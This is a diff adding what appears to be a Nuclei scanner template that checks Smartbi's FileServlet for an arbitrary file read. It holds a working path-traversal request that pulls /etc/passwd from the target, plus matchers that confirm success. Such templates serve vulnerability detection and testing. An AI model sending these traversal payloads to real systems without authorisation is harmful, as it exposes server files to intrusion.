@@ -1,0 +1,23 @@
+id: smartbi-fileservlet-file-read
+info:
+  name: Smartbi FileServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx"
+      - "{{BaseURL}}/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
